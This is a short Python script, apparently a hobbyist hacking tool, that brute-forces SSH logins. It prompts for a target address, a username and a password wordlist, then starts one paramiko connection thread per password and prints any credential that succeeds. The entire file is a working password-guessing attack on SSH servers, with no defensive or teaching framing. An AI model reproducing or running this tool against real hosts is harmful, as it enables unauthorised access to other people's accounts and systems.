# Importing neccessary modules

import paramiko
import sys
import os
import socket
import termcolor
import time
import threading

stop = 0
#Defining SSH class which contains functions required to bruteforce ssh
class SSH:
    def __init__(self):
        pass
    
    #Checking ssh connection with password 
    def sshConnect(self, password, code=0):
        global stop
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            ssh.connect(host, port=22, username=username, password=password)
            stop = 1
            print(termcolor.colored(("[+] *Found Password : " + password + " ,For Account : " + username + "\n"), 'green'))
            
        except paramiko.AuthenticationException:
            print(termcolor.colored(("[-] Incorrect Login :" + password), 'red'))
        except socket.errno:
            print(termcolor.colored(("[!!] Can'nt Connect"),'red'))       
        finally:
            ssh.close()
            
 
 #Taking user inputs           
host = input("[+] *Target Address : ")
username = input('[+] *SSH Username : ')
inputFile = input("[+] *Passwords File : ")

if os.path.exists(inputFile) == False:
    print("[!!] *No file found!")
    sys.exit(1)

#Reading password files
with open(inputFile) as file:
  
    for line in file.readlines():
        ssh = SSH()
        
        if(stop == 1):
            t.join()
            exit()
            
        #Speeding up brute forcing by creating thread for each password   
        password = line.strip()
        t = threading.Thread(target=ssh.sshConnect,args=(password,))    
        t.start()
        time.sleep(0.5)

